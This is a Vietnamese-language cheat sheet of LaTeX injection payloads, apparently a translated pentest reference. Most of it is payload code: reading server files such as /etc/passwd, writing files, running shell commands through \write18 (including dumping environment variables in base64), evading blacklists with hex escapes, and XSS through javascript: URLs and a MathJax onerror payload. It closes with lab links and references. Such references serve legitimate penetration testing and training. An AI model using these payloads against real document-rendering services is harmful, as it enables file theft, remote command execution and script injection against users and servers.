# LaTeX Injection

> LaTeX Injection là một dạng tấn công injection trong đó nội dung độc hại được chèn vào các tài liệu LaTeX. LaTeX được sử dụng rộng rãi để soạn thảo và định dạng tài liệu, đặc biệt trong lĩnh vực học thuật, nhằm tạo ra các tài liệu khoa học và toán học có chất lượng cao. Do sở hữu các khả năng scripting mạnh mẽ, LaTeX có thể bị kẻ tấn công lợi dụng để thực thi các lệnh tùy ý nếu không được áp dụng các biện pháp bảo vệ phù hợp.

## Tóm tắt

* [Thao tác với tệp](#file-manipulation)

  * [Đọc tệp](#read-file)
  * [Ghi tệp](#write-file)
* [Thực thi lệnh](#command-execution)
* [Cross Site Scripting](#cross-site-scripting)
* [Các bài lab](#labs)
* [Tài liệu tham khảo](#references)

## Thao tác với tệp

### Đọc tệp

Kẻ tấn công có thể đọc nội dung của các tệp nhạy cảm trên máy chủ.

Đọc tệp và diễn giải mã LaTeX bên trong:

```tex
\input{/etc/passwd}
\include{somefile} # tải tệp .tex (somefile.tex)
```

Đọc tệp chỉ có một dòng:

```tex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

Đọc tệp có nhiều dòng:

```tex
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

Đọc tệp văn bản **mà không diễn giải nội dung**, chỉ chèn trực tiếp nội dung thô của tệp:

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

Nếu điểm injection nằm sau phần header của tài liệu (`\usepackage` không thể được sử dụng), một số ký tự điều khiển có thể được vô hiệu hóa để sử dụng `\input` trên các tệp chứa `$`, `#`, `_`, `&`, byte null, ... (ví dụ các script Perl).

```tex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

Để bypass một blacklist, hãy thử thay thế một ký tự bằng giá trị hex Unicode của nó.

* `^^41` đại diện cho chữ A viết hoa
* `^^7e` đại diện cho dấu ngã (~), lưu ý rằng ký tự ‘e’ phải viết thường

```tex
\lstin^^70utlisting{/etc/passwd}
```

### Ghi tệp

Ghi tệp chỉ có một dòng:

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

## Thực thi lệnh

Kết quả của lệnh sẽ được chuyển hướng đến stdout, do đó cần sử dụng một tệp tạm thời để lấy kết quả.

```tex
\immediate\write18{id > output}
\input{output}
```

Nếu gặp bất kỳ lỗi LaTeX nào, hãy cân nhắc sử dụng base64 để lấy kết quả mà không gặp vấn đề với các ký tự đặc biệt (hoặc sử dụng `\verbatiminput`):

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```

## Cross Site Scripting

Từ [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

Trong [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)

```tex
\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
```

## Các bài lab

* [Root Me - LaTeX - Input](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)
* [Root Me - LaTeX - Command Execution](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)

## Tài liệu tham khảo

* [Hacking with LaTeX - Sebastian Neef - March 10, 2016](https://web.archive.org/web/20260209043241/https://0day.work/hacking-with-latex/)
* [Latex to RCE, Private Bug Bounty Program - Yasho - July 6, 2018](https://web.archive.org/web/20210117203905/https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
* [Pwning coworkers thanks to LaTeX - scumjr - November 28, 2016](https://web.archive.org/web/20161130151956/https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)
